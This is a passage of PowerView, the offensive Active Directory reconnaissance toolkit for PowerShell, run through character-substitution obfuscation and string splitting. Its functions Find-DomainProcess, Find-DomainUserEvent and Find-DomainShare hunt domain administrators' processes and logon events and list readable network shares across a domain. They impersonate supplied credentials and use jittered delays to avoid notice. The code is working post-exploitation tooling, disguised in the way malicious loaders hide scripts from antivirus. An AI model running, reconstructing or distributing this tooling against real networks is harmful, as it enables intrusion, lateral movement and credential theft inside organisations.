            if (gIF1PSBoundParameters[41aServer41a]) { gIF1GroupSearcherArguments[41aServer41a] = gIF1Server }
            if (gIF1PSBoundParameters[41aSearchScope41a]) { gIF1GroupSearcherArguments[41aSearchScope41a] = gIF1SearchScope }
            if (gIF1PSBoundParameters[41aResultPageSize41a]) { gIF1GroupSearcherArguments[41aResultPageSize41a] = gIF1ResultPageSize }
            if (gIF1PSBoundParameters[41aServerTimeLimit41a]) { gIF1GroupSearcherArguments[41aServerTimeLimit41a] = gIF1ServerTimeLimit }
            if (gIF1PSBoundParameters[41aTombstone41a]) { gIF1GroupSearcherArguments[41aTombstone41a] = gIF1Tombstone }
            if (gIF1PSBoundParameters[41aCredential41a]) { gIF1GroupSearcherArguments[41aCredential41a] = gIF1Credential }
            gIF1GroupSearcherArguments
            gIF1TargetUsers = Get-DomainGroupMember @GroupSearcherArguments U9B Select-Object -ExpandProperty MemberName
        }

        # the host enumeration block we41are using to enumerate all servers
        gIF1HostEnumBlock = {
            Param(gIF1ComputerName, gIF1ProcessName, gIF1TargetUsers, gIF1Credential)

            ForEach (gIF1TargetComputer in gIF1Computer'+'Name) {
                gIF1Up = Test-Connection -Count 1 -Quiet -ComputerName gIF1TargetComputer
                if (gIF1Up) {
                    # try to enumerate all active processes on the remote host
                    # and search for a specific process name
                    if (gIF1Credential) {
                        gIF1Processes = Get-WMIProcess -Credential gIF1Credential -ComputerName gIF1TargetComputer -'+'ErrorAction SilentlyContinue
                    }
                    else {
                        gIF1Processes = Get-WMIProcess -ComputerName gIF1TargetComputer -ErrorAction SilentlyContinue
                    }
                    ForEach (gIF1Process in gIF1Processes) {
                        # if we41are hunting for a process name or comma-separated names
                        if (gIF1ProcessName) {
                            if (gIF1ProcessName -Contains gIF1Process.ProcessName) {
                                gIF1Process
                            }
                        }
                        # if the session user is in the target list, display some output
                        elseif (gIF1TargetUsers -Contains gIF1Process.User) {
                            gIF1Process
                        }
                    }
                }
            }
        }
    }

    PROCESS {
        # only ignore threading if -Delay is passed
        if (g'+'IF1PSBoundParameters[41aDelay41a] -or gIF1PSBoundParameters[41aStopOnSuccess41a]) {

            Write-Verbose Zfr[Find-DomainProcess] Total number of hosts: gIF1(gIF1TargetComputers.count)Zfr
            Write-Verbose Zfr[Find-DomainProcess] Delay: gIF1Delay, Jitter: gIF1JitterZfr
            gIF1Counter = 0
            gIF1RandNo = New-Object System.Random

            ForEach (gIF1TargetComputer in gIF1TargetComputers) {
                gIF1Counter = gIF1Counter + 1

                # sleep for our semi-randomized interval
                Start-Sleep -Seconds gIF1RandNo.Next((1-gIF1Jitter)*gIF1Delay, (1+gIF1Jitter)*gIF1Delay)

                Write-Verbose Zfr[Find-DomainProcess] Enumerating server gIF1TargetComputer (gIF1Counter of gIF1(gIF1TargetComputers.count))Zfr
                gIF1Result = Invoke-Command -ScriptBlock gIF1HostEnumBlock -ArgumentList gIF1TargetComputer, gIF1TargetProcessName, gIF1TargetUsers, gIF1Credential
                gIF1Result

                if (gIF1Result -and gIF1StopOnSuccess) {
                    Write-Verbose Zfr[Find-DomainProcess] Target user found, returning earlyZfr
                    return
                }
            }
        }
        else {
            Write-Verbose Zfr[Find-DomainProcess] Using threading with threads: gIF1ThreadsZfr

            # if we41are using threading, kick off the script block with New-ThreadedFunction
            gIF1ScriptParams = @{
                41aProcessName41a = gIF1TargetProcessName
                41aTargetUsers41a = gIF1TargetUsers
                41aCredential41a = gIF1Credential
            }

            # if we41are using threading, kick off the script block with New-ThreadedFunction using the gIF1HostEnumBlock + params
            New-ThreadedFunction -ComputerName gIF1TargetComputers -ScriptBlock gIF1HostEnumBlock -ScriptParameters gIF1ScriptParams -Threads gIF1Threads
        }
    }
}


function Find-DomainUserEvent {
<#
.SYNOPSIS

Finds logon events on the current (or remote domain) for the specified users.

Author: Lee Christensen (@tifkin_), Justin Warner (@sixdub), Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainUser, Get-DomainGroupMember, Get-DomainController, Get-DomainUserEvent, New-ThreadedFunction  

.DESCRIPTION

Enumerates all domain controllers from the specified -Domain
(default of the local domain) using Get-DomainController, enumerates
the logon events for each using Get-DomainUserEvent, and filters
the results based on the targeting criteria.

.PARAMETER ComputerName

Specifies an explicit computer name to retrieve events from.

.PARAMETER Domain

Specifies a domain to query for domain controllers to enumerate.
Defaults to the current domain.

.PARAMETER Filter

A hashtable of PowerView.LogonEvent properties to filter for.
The 41aopU9BoperatorU9Boperation41a clause can have 41a&41a, 41aU9B41a, 41aand41a, or 41aor41a,
and is 41aor41a by default, meaning at least one clause matches instead of all.
See the exaples for usage.

.PARAMETER StartTime

The [DateTime] object representing the start of when to collect events.
Defa'+'ult of [DateTime]::Now.AddDays(-1).

.PARAMETER EndTime

The [DateTime] object representing the end of when to collect events.
Default of [DateTime]::Now.

.PARAMETER MaxEvents

The maximum number of events (per host) to retrieve. Default of 5000.

.PARAMETER UserIdentity

Specifies one or more user identities to search for.

.PARAMETER UserDomain

Specifies the domain to query for users to search for, defaults to the current domain.

.PARAMETER UserLDAPFilter

Specifies an LDAP query string that is used to search for target users.

.PARAMETER UserSearchBase

Specifi'+'es the LDAP source to search through for target users.
e.g. ZfrLDAP://OU=secret,DC=testlab,DC=localZfr. Useful for OU queries.

.PARAMETER UserGroupIdentity

Specifies a group identity to query for target users, defaults to 41aDomain Admins.
If any other user specifications are set, then UserGroupIdentity is ignored.

.PARAMETER UserAdminCount

Switch. Search for users users with 41a(adminCount=1)41a (meaning are/were privileged).

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under for computers, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target computer(s).

.PARAMETER StopOnSuccess

Switch. Stop hunting after finding after finding a target user.

.PARAMETER Delay

Specifies the delay (in seconds) between enumerating hosts, defaults to 0.

.PARAMETER Jitter

Specifies the jitter (0-1.0) to apply to any specified -Delay, defaults to +/- 0.3

.PARAMETER Threads

The number of threads to use for user searching, defaults to 20.

.EXAMPLE

Find-DomainUserEvent

Search for any user events matching domain admins on every DC in the current domain.

.EXAMPLE

gIF1cred = Get-Credential devYwWadministrator
Find-DomainUserEvent -ComputerName 41asecondary.dev.testlab.local41a -UserIdentity 41ajohn41a

Search for any user events matching the user 41ajohn41a on the 41asecondary.dev.testlab.local41a
domain controller using the alternate credential

.EXAMPLE

41aprimary.testlab.local U9B Find-DomainUserEvent -Filter @{41aIpAddress41a=41a192.168.52.200U9B192.168.52.20141a}

Find user events on the primary.testlab.local system where the event matches
the IPAddress 41a192.168.52.20041a or 41a192.168.52.20141a.

.EXAMPLE

gIF1cred = Get-Credential testlabYwWadministrator
Find-Doma'+'inUserEvent -Delay 1 -Filter @{41aLogonGuid41a=41ab8458aa9-b36e-eaa1-96e0-4551000fdb1941a; 41aTargetLogonId41a = 41a1023812841a; 41aop41a=41a&41a}

Find user events mathing the specified GUID AND the specified TargetLogonId, searching
through e'+'very domain controller in the current domain, enumerating each DC in serial
instead of in a threaded manner, using the alternate credential.

.OUTPUTS

PowerView.LogonEvent

PowerView.ExplicitCredentialLogon

.LINK

http://www.sixdub.net/2014/11/07/offensive-event-parsing-'+'bringing-home-trophies/
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(41aPSShouldProcess41a, 41a41a)]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(41aPSUseDeclaredVarsMoreThanAssignments41a, 41a41a)]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(41aPSUsePSCredentialType41a, 41a41a)]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(41aPSAvoidUsingPlainTextForPassword41a, 41a41a)]
    [OutputType(41aPowerView.LogonEvent41a)]
    [OutputType(41aPowerView.ExplicitCredentialLogon41a)]
    [CmdletBinding(DefaultParameterSetName = 41aDomain41a)]
    Param(
        [Parameter(ParameterSetName = 41aComputerName41a, Position = 0, ValueFromPipeline = gIF1True, ValueFromPipelineByPropertyName = gIF1True)]
        [Alias(41adnshostname41a, 41aHostName41a, 41aname41a)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        gIF1ComputerName,

        [Parameter(ParameterSetName = 41aDomain41a)]
        [ValidateNotNullOrEmpty()]
        [String]
        gIF1Domain,

        [ValidateNotNullOrEmpty()]
        [Hashtable]
        gIF1Filter,

        [Parameter(ValueFromPipelineByPropertyName = gIF1True)]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        gIF1StartTime = [DateTime]::Now.AddDays(-1),

        [Parame'+'ter(ValueFromPipelineByPropertyName = gIF1True)]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        gIF1EndTime = [DateTime]::Now,

        [ValidateRange(1, 1000000)]
        [Int]
        gIF1MaxEvents = 5000,

        [ValidateNotNullOrEmpty()]
        [String[]]
        gIF1UserIdentity,

        [ValidateNotNullOrEmpty()]
        [String]
        gIF1UserDomain,

        [ValidateNotNullOrEmpty()]
        [String]
        gIF1UserLDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String]
        gIF1UserSearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias(41aGroupName41a, 41aGroup41a)]
        [String[]]
        gIF'+'1UserGroupIdentity = 41aDomain Admins41a,

        [Alias(41aAdminCount41a)]
        [Switch]
        gIF1UserAdminCount,

        [Switch]
        gIF1CheckAccess,

        [ValidateNotNullOrEmpty()]
        [Alias(41aDomainController41a)]
        [String]
        gIF1Server,

        [ValidateSet(41aBase41a, 41aOneLevel41a, 41aSubtree41a)]
        [String]
        gIF1SearchScope = 41aSubtree41a,

        [ValidateRange(1, 10000)]
        [Int]
        gIF1ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        gIF1ServerTimeLimit,

        [Switch]
        gIF1Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        gIF1Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        gIF1StopOnSuccess,

        [ValidateRange(1, 10000)]
        [Int]
        gIF1Delay = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        gIF1Jitter = .3,

        [Int]
        [ValidateRange(1, 100)]
        gIF1Threads = 20
    )

    BEGIN {
        gIF1UserSearcherArguments = @{
            41aProperties41a = 41asamaccountname41a
        }
        if (gIF1PSBoundParameters[41aUserIdentity41a]) { gIF1UserSearcherArguments[41aIdentity41a] = gIF1UserIdentity }
        if (gIF1PSBoundParameters[41aUserDomain41a]) { gIF1UserSearcherArguments[41aDomain41a] = gIF1UserDomain }
        if (gIF1PSBoundParameters[41aUserLDAPFilter41a]) { gIF1UserSearcherArguments[41aLDAPFilter41a] = gIF1UserLDAPFilter }
        if (gIF1PSBoundParameters[41aUserSearchBase41a]) { gIF1UserSearcherArguments[41aSearchBase41a] = gIF1UserSearchBase }
        if (gIF1PSBoundParameters[41aUserAdminCount41a]) { gIF1UserSearcherArguments[41aAdminCount41a] = gIF1UserAdminCount }
        if (gIF1PSBoundParameters[41aServer41a]) { gIF1UserSearcherArguments[41aServer41a] = gIF1Server }
        if (gIF1PSBoundParameters[41aSearchSco'+'pe41a]) { gIF1UserSearcherArguments[41aSearchScope41a] = gIF1SearchScope }
        if (gIF1PSBoundParameters[41aResultPageSize41a]) { gIF1UserSearcherArguments[41aResultPageSize41a] = gIF1ResultPageSize }
        if (gIF1PSBoundParameters[41aServerTimeLimit41a]) { gIF1UserSearcherArguments[41aServerTimeLimit41a] = gIF1ServerTimeLimit }
        if (gIF1PSBoundParameters[41aTombstone41a]) { gIF1UserSearcherArguments[41aTombstone41a] = gIF1Tombstone }
        if (gIF1PSBoundParameters[41aCredential41a]) { gIF1UserSearcherArguments[41aCredential41a] = gIF1Credential }

        if (gIF1PSBoundParameters[41aUserIdentity41a] -or gIF1PSBoundParameters[41aUserLDAPFilter41a] -or gIF1PSBoundParameters[41aUserSearchBase41a] -or gIF1PSBoundParameters[41aUserAdminCount41a]) {
            gIF1TargetUsers = Get-DomainUser @UserSearcherArguments U9B Select-Object -ExpandProperty samaccountname
        }
        elseif (gIF1PSBoundParameters[41aUserGroupIdentity41a] -or (-not gIF1PSBoundParameters[41aFilter41a])) {
            # otherwise we41are querying a specific group
            gIF1GroupSearcherArguments = @{
                41aIdentity41a = gIF1UserGroupIdentity
                41aRecurse41a = gIF1True
            }
            Write-Verbose ZfrUserGroupIdentity: gIF1UserGroupIdentityZfr
            if (gIF1PSBoundParameters[41aUserDomain41a]) { gIF1GroupSearcherArguments[41aDomain41a] = gIF1UserDomain }
            if (gIF1PSBoundParameters[41aUserSearchBase41a]) { gIF1GroupSearcherArguments[41aSearchBase41a] = gIF1UserSearchBase }
            if (gIF1PSBoundParameters[41aServer41a]) { gIF1GroupSearcherArguments[41aServer41a] = gIF1Server }
            if (gIF1PSBoundParameters[41aSearchScope41a]) { gIF1GroupSearcherArguments[41aSearchScope41a] = gIF1SearchScope }
            if (gIF1PSBoundParameters[41aResultPageSize41a]) { gIF1GroupSearcherArguments[41aResultPageSize41a] = gIF1ResultPageSize }
            if (gIF1PSBoundParameters[41aServerTimeLimit41a]) { gIF1GroupSearcherArguments[41aServerTimeLimit41a] = gIF1ServerTimeLimit }
            if (gIF1PSBoundParameters[41aTombstone41a]) { gIF1GroupSearcherArguments[41aTombstone41a] = gIF1Tombstone }
            if (gIF1PSBoundParameters[41aCredential41a]) { gIF1GroupSearcherArguments[41aCredential41a] = gIF1Credential }
            gIF1TargetUsers = Get-DomainGroupMember @GroupSearcherArguments U9B Select-Object -ExpandProperty MemberName
        }

        # build the set of computers to enumerate
        if (gIF1PSBoundParameters[41aComputerName41a]) {
            gIF1TargetComputers = gIF1ComputerName
        }
     '+'   else {
            # if not -ComputerName is passed, query the current (or target) domain for domain controllers
            gIF1DCSearcherArguments = @{
                41aLDAP41a = gIF1True
            }
            if (gIF1PSBoundParameters[41aDomain41a]) { gIF1DCSearcherArguments[41aDomain41a] = gIF1Domain }
            if (gIF1PSBoundParameters[41aServer41a]) { gIF1DCSearcherArguments[41aServer41a] = gIF1Server }
            if (gIF1PSBoundParameters[41aCredential41a]) { gIF1DCSearcherArguments[41aCredential41a] = gIF1Credential }
            Write-Verbose Zfr[Find-DomainUserEvent] Querying for domain controllers in domain: gIF1DomainZfr
            gIF1TargetComputers = Get-DomainController @DCSearcherArguments U9B Select-Object -ExpandProperty dnshostname
        }
        if (gIF1TargetComputers -and (gIF1TargetComputers -isnot [System.Array])) {
            gIF1TargetComputers = @(,gIF1TargetComputers)
        }
        Write-Verbose Zfr[Find-DomainUserEvent] TargetComputers length: gIF1(gIF1TargetComputers.Length)Zfr
        Write-Verbose Zfr[Find-DomainUserEvent] TargetComputers gIF1TargetComputersZfr
        if (gIF1TargetComputers.Length -eq 0) {
            throw 41a[Find-DomainUserEvent] No hosts found to enumerate41a
        }

        # the host enumeration block we41are using to enumerate all servers
        gIF1HostEnumBlock = {
            Param(gIF1ComputerName, gIF1StartTime, gIF1EndTime, gIF1MaxEvents, gIF1TargetUsers, gIF1Filter, gIF1Credential)

            ForEach (gIF1TargetComputer in gIF1ComputerName) {
                gIF1Up = Test-Connection -Count 1 -Quiet -ComputerName gIF1TargetComputer
                if (gIF1Up) {
                    gIF1DomainUserEventArgs = @{
                        41aComputerName41a = gIF1TargetComputer
                    }
                    if (gIF1StartTime) { gIF1DomainUserEventArgs[41aStartTime41a] = gIF1StartTime }
                    if (gIF1EndTime) { gIF1DomainUserEventArgs[41aEndTime41a] = gIF1EndTime }
                    if (gIF1MaxEvents) { gIF1DomainUserEventArgs[41aMaxEvents41a] = gIF1MaxEvents }
                    if (gIF1Credential) { gIF1DomainUserEventArgs[41aCredential41a] = gIF1Credential }
                    if (gIF1Filter -or gIF1TargetUsers) {
                        if (gIF1TargetUsers) {
                            Get-DomainUserEvent @DomainUserEventArgs U9B Where-Object {gIF1TargetUsers -contains gIF1_.TargetUserName}
                        }
                        else {
                            gIF1Operator = 41aor41a
                            gIF1Filter.Keys U9B ForEach-Object {
                                if ((gIF1_ -eq 41aOp41a) -or (gIF1_ -eq 41aOperator41a) -or (gIF1_ -eq 41aOperation41a)) {
                                    if ((gIF1Filter[gIF1_] -match 41a&41a) -or (gIF1Filter[gIF1_] -eq 41aand41a)) {
                                        gIF1Operator = 41aand41a
                                    }
                                }
                            }
                            gIF1Keys = gIF1Filter.Keys U9B Where-Object {(gIF1_ -ne 41aOp41a) -and (gIF1_ -ne 41aOperator41a) -and (gIF1_ -ne 41aOperation41a)}
                            Get-DomainUserEvent @DomainUserEventArgs U9B ForEach-Object {
                                if (gIF1Operator -eq 41aor41a) {
                                    ForEach (gIF1Key in gIF1Keys) {
                                        if (gIF1_.ZfrgIF1KeyZfr -match gIF1Filter[gIF1Key]) {
                                            gIF1_
                                        }
                                    }
                                }
                                else {
                                    # and all clauses
                                    ForEach (gIF1Key in gIF1Keys) {
                                        if (gIF1_.ZfrgIF1KeyZfr -notmatch gIF1Filter[gIF1Key]) {
                                            break
                                        }
                                        gIF1_
                                    }
                                }
                            }
                        }
                    }
                    else {
                        Get-DomainUserEvent @DomainUserEventArgs
                    }
                }
            }
        }
    }

    PROCESS {
        # only ignore threading if -Delay is passed
        if (gIF1PSBoundParameters[41aDelay41a] -or gIF1PSBoundParameters[41aStopOnSuccess41a]) {

            Write-Verbose Zfr[Find-DomainUserEvent] Total number of hosts: gIF1(gIF1TargetComputers.count)Zfr
            Write-Verbose Zfr[Find-DomainUserEvent] Delay: gIF1Delay, Jitter: gIF1JitterZfr
            gIF1Counter = 0
            gIF1RandNo = New-Object System.Random

            ForEach (gIF1TargetComputer in gIF1TargetComputers) {
                gIF1Counter = gIF1Counter + 1

                # sleep for our semi-randomized interval
                Start-Sleep -Seconds gIF1RandNo.Next((1-gIF1Jitter)*gIF1Delay, (1+gIF1Jitter)*gIF1Delay)

                Write-Verbose Zfr[Find-DomainUserEvent] Enumerating server gIF1TargetComputer (gIF1Counter of gIF1(gIF1TargetComputers.count))Zfr
                gIF1Result = Invoke-Command -ScriptBlock gIF1HostEnumBlock -ArgumentList gIF1TargetComputer, gIF1StartTime, gIF1EndTime, gIF1MaxEvents, gIF1TargetUsers, gIF1Filter, gIF1Credential
                gIF1Result

                if (gIF1Result -and gIF1StopOnSuccess) {
                    Write-Verbose Zfr[Find-DomainUserEvent] Target user found, returning earlyZfr
                    return
                }
            }
        }
        else {
            Write-Verbose Zfr[Find-DomainUserEvent] Using threading with threads: gIF1ThreadsZfr

            # if we41are using threading, kick off the script block with New-ThreadedFunction
            gIF1ScriptParams = @{
                41aStartTime41a = gIF1StartTime
                41aEndTime41a = gIF1EndTime
                41aMaxEvents41a = gIF1MaxEvents
                41aTargetUsers41a = gIF1TargetUsers
                41aFilter41a = gIF1Filter
                41aCredential41a = gIF1Credential
            }

            # if we41are using threading, kick off the script block with New-ThreadedFunction using the gIF1HostEnumBlock + params
            New-ThreadedFunction -ComputerName gIF1TargetComputers -ScriptBlock gIF1HostEnumBlock -ScriptParameters gIF1ScriptParams -Threads gIF1Threads
        }
    }
}


function Find-DomainShare {
<#
.SYNOPSIS

Searches for computer shares on the domain. If -CheckShareAccess is passed,
then only shares the current user has read access to are returned.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainComputer, Invoke-UserImpersonation, Invoke-RevertToSelf, Get-NetShare, New-ThreadedFunction  

.'+'DESCRIPTION

This function enumerates all machines on the current (or specified) domain
using Get-DomainComputer, and enumerates the available shares for each
machine with Get-NetShare. If -CheckShareAccess is passed, then
[IO.Directory]::GetFiles() is used to check if the current user has read
access to the given share. If -Credential is passed, then
Invoke-UserImpersonation is used to impersonate the specified user before
enumeration, reverting after with Invoke-RevertToSelf.

.PARAMETER ComputerName

Specifies an array of one or more hosts '+'to enumerate, passable on the pipeline.
If -ComputerName is not passed, the default behavior is to enumerate all machines
in the domain returned by Get-DomainComputer.

.PARAMETER ComputerDomain

Specifies the domain to query for computers, defaults to the current domain.

.PARAMETER ComputerLDAPFilter

Specifies an LDAP query string that is used to search for computer objects.

.PARAMETER ComputerSearchBase

Specifies the LD'+'AP source to search through for computers,
e.g. ZfrLDAP://OU=secret,DC=testlab,DC=localZfr. Useful for OU queries.

.PARAMETER ComputerOperatingSystem

Search computers with a specific operating system, wildcards accepted.

.PARAMETER ComputerServicePack

Search computers with a specific service pack, wildcards accepted.

.PARAMETER ComputerSiteName

Search computers in the specific AD Site name, wildcards accepted.

.PARAMETER CheckShareAccess

Switch. Only display found shares that the local user has access to.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under for computers, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain and target systems.

.PARAMETER Delay

Specifies the delay (in seconds) between enumerating hosts, defaults to 0.

.PARAMETER Jitter

Specifies the jitter (0-1.0) to apply to any specified -Delay, defaults to +/- 0.3

.PARAMETER Threads

The number of threads to use for user searching, defaults to 20.

.EXAMPLE

Find-DomainShare

Find all domain shares in the current domain.

.EXAMPLE

Find-DomainShare -CheckShareAccess

Find all domain shares in the current domain that the current user has
read access to.

.EXAMPLE

gIF1SecPassword = ConvertTo-SecureString 41aPassword123!41a -AsPlainText -Force
gIF1Cred = New-Object System.Management.Automation.PSCredential(41aTESTLABYwWdfm.a41a, gIF1SecPassword)
Find-DomainShare -Domain testlab.local -Credential gIF1Cred

Searches for domain shares in the testlab.local domain using the specified alternate credentials.

.OUTPUTS

PowerView.ShareInfo
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(41aPSShouldProcess41a, 41a41a)]
    [OutputType(41aPowerView.ShareInfo41a)]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = gIF1True, ValueFromPipelineByPropertyName = gIF1True)]
        [Alias(41aDNSHostName41a)]
        [String[]]
        gIF1ComputerName,

        [ValidateNotNullOrEmpty()]
        [Alias(41aDomain41a)]
        [String]
        gIF1ComputerDomain,

        [ValidateNotNullOrEmpty()]
        [String]
        gIF1ComputerLDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String]
        gIF1ComputerSearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias(41aOperatingSystem41a)]
        [String]
        gIF1ComputerOperatingSystem,

        [ValidateNotNullOrEmpty()]
        [Alias(41aServicePack41a)]
        [String]
        gIF1ComputerServicePack,

        [ValidateNotNullOrEmpty()]
        [Alias(41aSiteName41a)]
        [String]
        gIF1ComputerSiteName,

        [Alias(41aCheckAccess41a)]
        [Switch]
        gIF1CheckShareAccess,

        [ValidateNotNullOrEmpty()]
        [Alias(41aDomainController41a)]
        [String]
        gIF1Server,

        [ValidateSet(41aBase41a, 41aOneLevel41a, 41aSubtree41a)]
        [String]
        gIF1SearchScope = 41aSubtree41a,

        [ValidateRange(1, 10000)]
        [Int]
        gIF1ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        gIF1ServerTimeLimit,

        [Switch]
        gIF1Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        gIF1Credential'+' = [Management.Automation.PSCredential]::Empty,

        [ValidateRange(1, 10000)]
        [Int]
        gIF1Delay = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        gIF1Jitter = .3,

        [Int]
        [ValidateRange(1, 100)]
        gIF1Threads = 20
    )

    BEGIN {

        gIF1ComputerSearcherArguments = @{
            41aProperties41a = 41adnshostname41a
        }
        if (gIF1PSBoundParameters[41aComputerDomain41a]) { gIF1ComputerSearcherArguments[41aDomain41a] = gIF1ComputerDomain }
        if (gIF1PSBoundParameters[41aComputerLDAPFilter41a]) { gIF1ComputerSearcherArguments[41aLDAPFilter41a] = gIF1ComputerLDAPFilter }
        if (gIF1PSBoundParameters[41aComputerSearchBase41a]) { gIF1ComputerSearcherArguments[41aSearchBase41a] = gIF1ComputerSearchBase }
        if (gIF1PSBoundParameters[41aUnconstrained41a]) { gIF1ComputerSearcherArguments[41aUnconstrained41a] = gIF1Unconstrained }
        if (gIF1PSBoundParameters[41aComputerOperatingSystem41a]) { gIF1ComputerSearcherArguments[41aOperatingSystem41a] = gIF1OperatingSystem }
        if (gIF1PSBoundParameters[41aComputerServicePack41a]) { gIF1ComputerSearcherArguments[41aServicePack41a] = gIF1ServicePack }
        if (gIF1PSBoundParameters[41aComputerSiteName41a]) { gIF1ComputerSearcherArguments[41aSiteName41a] = gIF1SiteName }
        if (gIF1PSBoundParameters[41aServer41a]) { gIF1ComputerSearcherArguments[41aServer41a] = gIF1S'+'erver }
        if (gIF1PSBoundParameters[41aSearchScope41a]) { gIF1ComputerSearcherArguments[41aSearchScope41a] = gIF1SearchScope }
        if (gIF1PSBoundParameters[41aResultPageSize41a]) { gIF1ComputerSearcherArguments[41aResultPageSize41a] = gIF1ResultPageSize }
        if (gIF1PSBoundParameters[41aServerTimeLimit41a]) { gIF1ComputerSearcherArguments[41aServerTimeLimit41a] = gIF1ServerTimeLimit }
        if (gIF1PSBoundParameters[41aTombstone41a]) { gIF1ComputerSearcherArguments[41aTombstone41a] = gIF1Tombstone }
        if (gIF1PSBoundParameters[41aCredential41a]) { gIF1ComputerSearcherArguments[41aCredential41a] = gIF1Credential }

        if (gIF1PSBoundParameters[41aComputerName41a]) {
            gIF1TargetComputers = gIF1ComputerNa'+'me
        }
        else {
            Write-Verbose 41a[Find-DomainShare] Querying computers in the domain41a
            gIF1TargetComputers = Get-DomainComputer @ComputerSearcherArguments U9B Select-Object -ExpandProperty dnshostname
        }
        Write-Verbose Zfr[Find-DomainShare] TargetComputers length: gIF1(gIF1TargetComputers.Length)Zfr
        if (gIF1TargetComputers.Length -eq 0) {
            throw 41a[Find-DomainShare] No hosts found to enumerate41a
        }

        # the host enumeration block we41are using to enumerate all servers
        gIF1HostEnumBlock = {
            Param(gIF1ComputerName, gIF1CheckShareAccess, gIF1TokenHandle)

            if (gIF1TokenHandle) {
                # impersonate the the token produced by LogonUser()/Invoke-UserImpersonation
                gIF1Null = Invoke-UserImpersonation -TokenHandle gIF1TokenHandle -Quiet
            }

            ForEach (gIF1TargetComputer in gIF1ComputerName) {
                gIF1Up = Test-Connection -Count 1 -Quiet -ComputerName gIF1TargetComputer
                if (gIF1Up) {
                    # get the shares for this host and check what we find
                    gIF1Shares = Get-NetShare -ComputerName gIF1TargetComputer
                    ForEach (gIF1Share in gIF1Shares) {
                        gIF1ShareName = gIF1Share.Name
                        # gIF1Remark = gIF1Share.Remark
                        gIF1Path = 41aYwWYwW41a+gIF1TargetComputer+41aYwW41a+gIF1ShareName

                        if ((gIF1ShareName) -and (gIF1ShareName.trim() -ne 41a41a)) {
                            # see if we want to check access to this share
                            if (gIF1CheckShareAccess) {
                                # check if the user has access to this path
                                try {
                                    gIF1Null = [IO.Directory]::GetFiles(gIF1Path)
                                    gIF1Share
                                }
                                catch {
                                    Write-Verbose ZfrError accessing share path gIF1Path : gIF1_Zfr
                                }
                            }
                            else {
                                gIF1Share
                            }
                        }
                    }
                }
            }

            if (gIF1TokenHandle) {
                Invoke-RevertToSelf
            }
        }

        gIF1LogonToken = gIF1Null
        if (gIF1PSBoundParameters[41aCredential41a]) {
            if (gIF1PSBoundParameters[41aDelay41a] -or gIF1PSBoundParameters[41aStopOnSuccess41a]) {
                gIF1LogonToken = Invoke-UserImpersonation -Credential gIF1Credential
            }
            else {
                gIF1LogonToken = Invoke-UserImpersonation -Credential gIF1Credential -Quiet
            }
        }
    }

    PROCESS {
        # only ignore threading if -Delay is passed
        if (gIF1PSBoundParameters[41aDelay41a] -or gIF1PSBoundParameters[41aStopOnSuccess41a]) {

            Write-Verbose Zfr[Find-DomainShare] Total number of hosts: gIF1(gIF1TargetComputers.count)Zfr
            Write-Verbose Zfr[Find-DomainShare] Delay: gIF1Delay, Jitter: gIF1JitterZfr
            gIF1Counter = 0
            gIF1RandNo = New-Object System.Random

            ForEach (gIF1TargetComputer in gIF1TargetComputers) {
                gIF1Counter = gIF1Counter + 1

                # sleep for our semi-randomized interval
                Start-Sleep -Seconds gIF1RandNo.Next((1-gIF1Jitter)*gIF1Delay, (1+gIF1Jitter)*gIF1Delay)

                Write-Verbose Zfr[Find-DomainShare] Enumerating server gIF1TargetComputer (gIF1Counter of gIF1(gIF1TargetComputers.count))Zfr
                Invoke-Command -ScriptBlock gIF1HostEnumBlock -ArgumentList gIF1TargetComputer, gIF1CheckShareAccess, gIF1LogonToken
            }
        }
        else {
            Write-Verbose Zfr[Find-DomainShare] Using threading with threads: gIF1'+'ThreadsZfr

            # if we41are using threading, kick off the script block with New-ThreadedFunction
            gIF1ScriptParams = @{
                41aCheckShareAccess41a = gIF1CheckShareAccess
                41aTokenHandle41a = gIF1LogonToken
            }

            # if we41are using threading, kick off the script block with New-ThreadedFunction using the gIF1HostEnumBlock + params
            New-ThreadedFunction -ComputerName gIF1TargetComputers -ScriptBlock gIF1HostEnumBlock -ScriptParameters gIF1ScriptParams -Threads gIF1Threads
        }
    }

    END {
        if (gIF1LogonToken) {
            Invoke-RevertToSelf -TokenHan'+'dle gIF1LogonToken
        }
    }
}


function Find-InterestingDomainShareFile {
<#
